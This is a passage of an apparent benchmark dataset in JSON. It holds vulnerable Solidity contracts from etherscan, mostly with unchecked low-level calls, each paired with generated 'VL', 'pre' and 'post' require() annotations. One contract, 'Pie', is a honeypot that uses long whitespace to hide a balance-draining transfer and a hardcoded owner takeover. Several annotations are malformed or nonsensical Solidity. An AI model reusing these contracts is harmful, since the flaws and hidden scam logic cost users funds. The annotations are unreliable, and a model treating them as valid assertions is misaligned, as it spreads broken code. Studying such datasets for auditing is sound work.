            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n \n}",
            {
                "VL": [
                    96,
                    "require(_addr.send(_wei));"
                ],
                "pre": [
                    92,
                    "require(_addr!=address(0));"
                ],
                "post": [
                    101,
                    "require(Holders[_addr]>=_wei);"
                ]
            }
        ]
    ],
    "0x4a66ad0bca2d700f11e1f2fc2c106f7d3264504c.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 19 \n */\n\npragma solidity ^0.4.18;\n\ncontract EBU{\n    address public from = 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9;\n    address public caddress = 0x1f844685f7Bf86eFcc0e74D8642c54A257111923;\n    \n    function transfer(address[] _tos,uint[] v)public returns (bool){\n        require(msg.sender == 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9);\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n\n            caddress.call(id,from,_tos[i],v[i]*1000000000000000000);\n        }\n        return true;\n    }\n}",
            {
                "VL": [
                    18,
                    "require(_tos[i]!=address(0));"
                ],
                "pre": [
                    14,
                    "require(msg.sender==from);"
                ],
                "post": [
                    22,
                    "require(false);"
                ]
            }
        ]
    ],
    "0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 12\n */\n\npragma solidity ^0.4.10;\n\ncontract Caller {\n    function callAddress(address a) {\n\n        a.call();\n    }\n}",
            {
                "VL": [
                    11,
                    "require(a.call());"
                ],
                "pre": [
                    11,
                    "require(a.call());"
                ],
                "post": [
                    13,
                    "require(false);"
                ]
            }
        ]
    ],
    "0xb620cee6b52f96f3c6b253e6eea556aa2d214a99.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 100,106,133\n */\n\n// by nightman\n// winner gets the contract balance\n// 0.02 to play\n\n\npragma solidity ^0.4.23;\n\ncontract DrainMe {\n\n//constants\n\naddress public winner = 0x0;\naddress public owner;\naddress public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;\naddress public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;\naddress[] public players;\n\nmapping(address=>bool) approvedPlayers;\n\nuint256 public secret;\nuint256[] public seed = [951828771,158769871220];\nuint256[] public balance;\n\n//constructor\n\nfunction DranMe() public payable{\n\towner = msg.sender;\n}\n\n//modifiers\n\nmodifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n}\n\nmodifier onlyWinner() {\n    require(msg.sender == winner);\n    _;\n}\n\nmodifier onlyPlayers() {\n    require(approvedPlayers[msg.sender]);\n    _;\n}\n\n//functions\n\nfunction getLength() public constant returns(uint256) {\n\treturn seed.length;\n}\n\nfunction setSecret(uint256 _secret) public payable onlyOwner{\n\tsecret = _secret;\n}\n\nfunction getPlayerCount() public constant returns(uint256) {\n\treturn players.length;\n}\n\nfunction getPrize() public constant returns(uint256) {\n\treturn address(this).balance;\n}\n\nfunction becomePlayer() public payable{\n\trequire(msg.value >= 0.02 ether);\n\tplayers.push(msg.sender);\n\tapprovedPlayers[msg.sender]=true;\n}\n\nfunction manipulateSecret() public payable onlyPlayers{\n\trequire (msg.value >= 0.01 ether);\n\tif(msg.sender!=owner || unlockSecret()){\n\t    uint256 amount = 0;\n        msg.sender.transfer(amount);\n\t}\n}\n\nfunction unlockSecret() private returns(bool){\n    bytes32 hash = keccak256(blockhash(block.number-1));\n    uint256 secret = uint256(hash);\n        if(secret%5==0){\n            winner = msg.sender;\n            return true;\n        }\n        else{\n            return false;\n        }\n    }\n\nfunction callFirstTarget () public payable onlyPlayers {\n\trequire (msg.value >= 0.005 ether);\n\n\tfirstTarget.call.value(msg.value)();\n}\n\nfunction callSecondTarget () public payable onlyPlayers {\n\trequire (msg.value >= 0.005 ether);\n\n\tsecondTarget.call.value(msg.value)();\n}\n\nfunction setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {\n\tseed[_index] = _value;\n}\n\t\nfunction addSeed (uint256 _add) public payable onlyPlayers {\n\tseed.length = _add;\n}\n\nfunction guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {\n\treturn (_seed / (seed[0]*seed[1]));\n\tif((_seed / (seed[0]*seed[1])) == secret) {\n\t\towner = winner;\n\t}\n}\n\nfunction checkSecret () public payable onlyPlayers returns(bool) {\n    require(msg.value >= 0.01 ether);\n    if(msg.value == secret){\n        return true;\n    }\n}\n\nfunction winPrize() public payable onlyOwner {\n\n\towner.call.value(1 wei)();\n}\n\nfunction claimPrize() public payable onlyWinner {\n\twinner.transfer(address(this).balance);\n}\n\n//fallback function\n\nfunction() public payable{\n\t}\n}",
            {
                "VL": [
                    99,
                    "require(msg.sender==firstTarget);"
                ],
                "pre": [
                    98,
                    "require(msg.sender==firstTarget);"
                ],
                "post": [
                    101,
                    "require(firstTarget.call.value(msg.value)());"
                ]
            }
        ],
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 100,106,133\n */\n\n// by nightman\n// winner gets the contract balance\n// 0.02 to play\n\n\npragma solidity ^0.4.23;\n\ncontract DrainMe {\n\n//constants\n\naddress public winner = 0x0;\naddress public owner;\naddress public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;\naddress public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;\naddress[] public players;\n\nmapping(address=>bool) approvedPlayers;\n\nuint256 public secret;\nuint256[] public seed = [951828771,158769871220];\nuint256[] public balance;\n\n//constructor\n\nfunction DranMe() public payable{\n\towner = msg.sender;\n}\n\n//modifiers\n\nmodifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n}\n\nmodifier onlyWinner() {\n    require(msg.sender == winner);\n    _;\n}\n\nmodifier onlyPlayers() {\n    require(approvedPlayers[msg.sender]);\n    _;\n}\n\n//functions\n\nfunction getLength() public constant returns(uint256) {\n\treturn seed.length;\n}\n\nfunction setSecret(uint256 _secret) public payable onlyOwner{\n\tsecret = _secret;\n}\n\nfunction getPlayerCount() public constant returns(uint256) {\n\treturn players.length;\n}\n\nfunction getPrize() public constant returns(uint256) {\n\treturn address(this).balance;\n}\n\nfunction becomePlayer() public payable{\n\trequire(msg.value >= 0.02 ether);\n\tplayers.push(msg.sender);\n\tapprovedPlayers[msg.sender]=true;\n}\n\nfunction manipulateSecret() public payable onlyPlayers{\n\trequire (msg.value >= 0.01 ether);\n\tif(msg.sender!=owner || unlockSecret()){\n\t    uint256 amount = 0;\n        msg.sender.transfer(amount);\n\t}\n}\n\nfunction unlockSecret() private returns(bool){\n    bytes32 hash = keccak256(blockhash(block.number-1));\n    uint256 secret = uint256(hash);\n        if(secret%5==0){\n            winner = msg.sender;\n            return true;\n        }\n        else{\n            return false;\n        }\n    }\n\nfunction callFirstTarget () public payable onlyPlayers {\n\trequire (msg.value >= 0.005 ether);\n\n\tfirstTarget.call.value(msg.value)();\n}\n\nfunction callSecondTarget () public payable onlyPlayers {\n\trequire (msg.value >= 0.005 ether);\n\n\tsecondTarget.call.value(msg.value)();\n}\n\nfunction setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {\n\tseed[_index] = _value;\n}\n\t\nfunction addSeed (uint256 _add) public payable onlyPlayers {\n\tseed.length = _add;\n}\n\nfunction guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {\n\treturn (_seed / (seed[0]*seed[1]));\n\tif((_seed / (seed[0]*seed[1])) == secret) {\n\t\towner = winner;\n\t}\n}\n\nfunction checkSecret () public payable onlyPlayers returns(bool) {\n    require(msg.value >= 0.01 ether);\n    if(msg.value == secret){\n        return true;\n    }\n}\n\nfunction winPrize() public payable onlyOwner {\n\n\towner.call.value(1 wei)();\n}\n\nfunction claimPrize() public payable onlyWinner {\n\twinner.transfer(address(this).balance);\n}\n\n//fallback function\n\nfunction() public payable{\n\t}\n}",
            {
                "VL": [
                    105,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    104,
                    "require(msg.sender==winner);"
                ],
                "post": [
                    107,
                    "require(msg.sender==winner);"
                ]
            }
        ],
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 100,106,133\n */\n\n// by nightman\n// winner gets the contract balance\n// 0.02 to play\n\n\npragma solidity ^0.4.23;\n\ncontract DrainMe {\n\n//constants\n\naddress public winner = 0x0;\naddress public owner;\naddress public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;\naddress public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;\naddress[] public players;\n\nmapping(address=>bool) approvedPlayers;\n\nuint256 public secret;\nuint256[] public seed = [951828771,158769871220];\nuint256[] public balance;\n\n//constructor\n\nfunction DranMe() public payable{\n\towner = msg.sender;\n}\n\n//modifiers\n\nmodifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n}\n\nmodifier onlyWinner() {\n    require(msg.sender == winner);\n    _;\n}\n\nmodifier onlyPlayers() {\n    require(approvedPlayers[msg.sender]);\n    _;\n}\n\n//functions\n\nfunction getLength() public constant returns(uint256) {\n\treturn seed.length;\n}\n\nfunction setSecret(uint256 _secret) public payable onlyOwner{\n\tsecret = _secret;\n}\n\nfunction getPlayerCount() public constant returns(uint256) {\n\treturn players.length;\n}\n\nfunction getPrize() public constant returns(uint256) {\n\treturn address(this).balance;\n}\n\nfunction becomePlayer() public payable{\n\trequire(msg.value >= 0.02 ether);\n\tplayers.push(msg.sender);\n\tapprovedPlayers[msg.sender]=true;\n}\n\nfunction manipulateSecret() public payable onlyPlayers{\n\trequire (msg.value >= 0.01 ether);\n\tif(msg.sender!=owner || unlockSecret()){\n\t    uint256 amount = 0;\n        msg.sender.transfer(amount);\n\t}\n}\n\nfunction unlockSecret() private returns(bool){\n    bytes32 hash = keccak256(blockhash(block.number-1));\n    uint256 secret = uint256(hash);\n        if(secret%5==0){\n            winner = msg.sender;\n            return true;\n        }\n        else{\n            return false;\n        }\n    }\n\nfunction callFirstTarget () public payable onlyPlayers {\n\trequire (msg.value >= 0.005 ether);\n\n\tfirstTarget.call.value(msg.value)();\n}\n\nfunction callSecondTarget () public payable onlyPlayers {\n\trequire (msg.value >= 0.005 ether);\n\n\tsecondTarget.call.value(msg.value)();\n}\n\nfunction setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {\n\tseed[_index] = _value;\n}\n\t\nfunction addSeed (uint256 _add) public payable onlyPlayers {\n\tseed.length = _add;\n}\n\nfunction guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {\n\treturn (_seed / (seed[0]*seed[1]));\n\tif((_seed / (seed[0]*seed[1])) == secret) {\n\t\towner = winner;\n\t}\n}\n\nfunction checkSecret () public payable onlyPlayers returns(bool) {\n    require(msg.value >= 0.01 ether);\n    if(msg.value == secret){\n        return true;\n    }\n}\n\nfunction winPrize() public payable onlyOwner {\n\n\towner.call.value(1 wei)();\n}\n\nfunction claimPrize() public payable onlyWinner {\n\twinner.transfer(address(this).balance);\n}\n\n//fallback function\n\nfunction() public payable{\n\t}\n}",
            {
                "VL": [
                    132,
                    "require(msg.value==1ether);"
                ],
                "pre": [
                    132,
                    "require(msg.value==1ether);"
                ],
                "post": [
                    134,
                    "require(winner.call.value(address(this).balance)());"
                ]
            }
        ]
    ],
    "0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.4.24;\n\n\ncontract airPort{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n\n            caddress.call(id,from,_tos[i],v);\n        }\n        return true;\n    }\n}",
            {
                "VL": [
                    16,
                    "require(caddress.call(id,from,_tos[i],v));"
                ],
                "pre": [
                    13,
                    "require(msg.sender==from);"
                ],
                "post": [
                    20,
                    "require(false);"
                ]
            }
        ]
    ],
    "0x958a8f594101d2c0485a52319f29b2647f2ebc06.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 55\n */\n\npragma solidity ^0.4.16;\n\n/// @author Jordi Baylina\n/// Auditors: Griff Green & psdev\n/// @notice Based on http://hudsonjameson.com/ethereummarriage/\n/// License: GNU-3\n\n/// @dev `Owned` is a base level contract that assigns an `owner` that can be\n///  later changed\ncontract Owned {\n\n    /// @dev `owner` is the only address that can call a function with this\n    /// modifier\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    address public owner;\n\n    /// @notice The Constructor assigns the message sender to be `owner`\n    function Owned() {\n        owner = msg.sender;\n    }\n\n    address public newOwner;\n\n    /// @notice `owner` can step down and assign some other address to this role\n    /// @param _newOwner The address of the new owner\n    ///  an unowned neutral vault, however that cannot be undone\n    function changeOwner(address _newOwner) onlyOwner {\n        newOwner = _newOwner;\n    }\n    /// @notice `newOwner` has to accept the ownership before it is transferred\n    ///  Any account or any contract with the ability to call `acceptOwnership`\n    ///  can be used to accept ownership of this contract, including a contract\n    ///  with no other functions\n    function acceptOwnership() {\n        if (msg.sender == newOwner) {\n            owner = newOwner;\n        }\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function execute(address _dst, uint _value, bytes _data) onlyOwner {\n\n        _dst.call.value(_value)(_data);\n    }\n}\n\n\ncontract Marriage is Owned\n{\n    // Marriage data variables\n    string public partner1;\n    string public partner2;\n    uint public marriageDate;\n    string public marriageStatus;\n    string public vows;\n\n    Event[] public majorEvents;\n    Message[] public messages;\n\n    struct Event {\n        uint date;\n        string name;\n        string description;\n        string url;\n    }\n\n    struct Message {\n        uint date;\n        string nameFrom;\n        string text;\n        string url;\n        uint value;\n    }\n\n    modifier areMarried {\n        require(sha3(marriageStatus) == sha3(\"Married\"));\n        _;\n    }\n\n    //Set Owner\n    function Marriage(address _owner) {\n        owner = _owner;\n    }\n\n    function numberOfMajorEvents() constant public returns (uint) {\n        return majorEvents.length;\n    }\n\n    function numberOfMessages() constant public returns (uint) {\n        return messages.length;\n    }\n\n    // Create initial marriage contract\n    function createMarriage(\n        string _partner1,\n        string _partner2,\n        string _vows,\n        string url) onlyOwner\n    {\n        require(majorEvents.length == 0);\n        partner1 = _partner1;\n        partner2 = _partner2;\n        marriageDate = now;\n        vows = _vows;\n        marriageStatus = \"Married\";\n        majorEvents.push(Event(now, \"Marriage\", vows, url));\n        MajorEvent(\"Marrigage\", vows, url);\n    }\n\n    // Set the marriage status if it changes\n    function setStatus(string status, string url) onlyOwner\n    {\n        marriageStatus = status;\n        setMajorEvent(\"Changed Status\", status, url);\n    }\n\n    // Set the IPFS hash of the image of the couple\n    function setMajorEvent(string name, string description, string url) onlyOwner areMarried\n    {\n        majorEvents.push(Event(now, name, description, url));\n        MajorEvent(name, description, url);\n    }\n\n    function sendMessage(string nameFrom, string text, string url) payable areMarried {\n        if (msg.value > 0) {\n            owner.transfer(this.balance);\n        }\n        messages.push(Message(now, nameFrom, text, url, msg.value));\n        MessageSent(nameFrom, text, url, msg.value);\n    }\n\n\n    // Declare event structure\n    event MajorEvent(string name, string description, string url);\n    event MessageSent(string name, string description, string url, uint value);\n}",
            {
                "VL": [
                    54,
                    "require(_dst.call.value(_value)(_data).gas(_value)>0);"
                ],
                "pre": [
                    54,
                    "require(_dst.call.value(_value)(_data));"
                ],
                "post": [
                    56,
                    "require(false);"
                ]
            }
        ]
    ],
    "0x84d9ec85c9c568eb332b7226a8f826d897e0a4a8.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 56\n */\n\npragma solidity ^0.4.16;\n\n/// @author Bowen Sanders\n/// sections built on the work of Jordi Baylina (Owned, data structure)\n/// smartwedindex.sol contains a simple index of contract address, couple name, actual marriage date, bool displayValues to\n/// be used to create an array of all SmartWed contracts that are deployed \n/// contract 0wned is licesned under GNU-3\n\n/// @dev `Owned` is a base level contract that assigns an `owner` that can be\n///  later changed\ncontract Owned {\n\n    /// @dev `owner` is the only address that can call a function with this\n    /// modifier\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    address public owner;\n\n    /// @notice The Constructor assigns the message sender to be `owner`\n    function Owned() {\n        owner = msg.sender;\n    }\n\n    address public newOwner;\n\n    /// @notice `owner` can step down and assign some other address to this role\n    /// @param _newOwner The address of the new owner\n    ///  an unowned neutral vault, however that cannot be undone\n    function changeOwner(address _newOwner) onlyOwner {\n        newOwner = _newOwner;\n    }\n    /// @notice `newOwner` has to accept the ownership before it is transferred\n    ///  Any account or any contract with the ability to call `acceptOwnership`\n    ///  can be used to accept ownership of this contract, including a contract\n    ///  with no other functions\n    function acceptOwnership() {\n        if (msg.sender == newOwner) {\n            owner = newOwner;\n        }\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function execute(address _dst, uint _value, bytes _data) onlyOwner {\n\n        _dst.call.value(_value)(_data);\n    }\n}\n\n// contract WedIndex \n\ncontract WedIndex is Owned {\n\n    // declare index data variables\n    string public wedaddress;\n    string public partnernames;\n    uint public indexdate;\n    uint public weddingdate;\n    uint public displaymultisig;\n\n    IndexArray[] public indexarray;\n\n    struct IndexArray {\n        uint indexdate;\n        string wedaddress;\n        string partnernames;\n        uint weddingdate;\n        uint displaymultisig;\n    }\n    \n    function numberOfIndex() constant public returns (uint) {\n        return indexarray.length;\n    }\n\n\n    // make functions to write and read index entries and nubmer of entries\n    function writeIndex(uint indexdate, string wedaddress, string partnernames, uint weddingdate, uint displaymultisig) {\n        indexarray.push(IndexArray(now, wedaddress, partnernames, weddingdate, displaymultisig));\n        IndexWritten(now, wedaddress, partnernames, weddingdate, displaymultisig);\n    }\n\n    // declare events\n    event IndexWritten (uint time, string contractaddress, string partners, uint weddingdate, uint display);\n}",
            {
                "VL": [
                    55,
                    "require(_dst.call.value(_value)(_data).gas(_data.length*10000));"
                ],
                "pre": [
                    55,
                    "require(_dst.call.value(_value)(_data).gas(_data.length*10000));"
                ],
                "post": [
                    57,
                    "require(false);"
                ]
            }
        ]
    ],
    "0xbaa3de6504690efb064420d89e871c27065cdd52.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.23;\n\ncontract Proxy  {\n    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n    function proxy(address target, bytes data) public payable {\n\n        target.call.value(msg.value)(data);\n    }\n}\n\ncontract VaultProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n    \n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            Owner = msg.sender;\n            deposit();\n        }\n    }\n    \n    function deposit() public payable {\n        if (msg.value > 0.25 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n    \n    function withdraw(uint256 amount) public onlyOwner {\n        if (amount>0 && Deposits[msg.sender]>=amount) {\n            msg.sender.transfer(amount);\n        }\n    }\n}",
            {
                "VL": [
                    13,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    13,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    15,
                    "require(target.call.value(msg.value)(data));"
                ]
            }
        ]
    ],
    "0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Pie\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetPie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n}",
            {
                "VL": [
                    43,
                    "require(msg.value>0);"
                ],
                "pre": [
                    42,
                    "require(msg.value>0);"
                ],
                "post": [
                    45,
                    "require(adr.balance>=msg.value);"
                ]
            }
        ]
    ],
    "0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n    function Bal() public constant returns(uint){return this.balance;}\n}",
            {
                "VL": [
                    43,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),(address)this)>=amount));"
                ],
                "pre": [
                    43,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),(address)this)>=amount));"
                ],
                "post": [
                    45,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),to)>0);"
                ]
            }
        ],
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n    function Bal() public constant returns(uint){return this.balance;}\n}",
            {
                "VL": [
                    96,
                    "require(_addr.send(_wei));"
                ],
                "pre": [
                    92,
                    "require(_addr!=0x0);"
                ],
                "post": [
                    101,
                    "require(Holders[msg.sender]>=_wei);"
                ]
            }
        ]
    ],
    "0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.25; \ncontract demo{\n    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n\n            caddress.call(id,from,_tos[i],v[i]);\n        }\n        return true;\n    }\n}",
            {
                "VL": [
                    13,
                    "require(caddress.call(id,from,_tos[i],v[i]));"
                ],
                "pre": [
                    10,
                    "require(msg.sender==from);"
                ],
                "post": [
                    17,
                    "require(false);"
                ]
            }
        ]
    ],
    "0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[_addr]>0)\n        {\n            if(_addr.call.value(_wei)())\n            {\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n}",
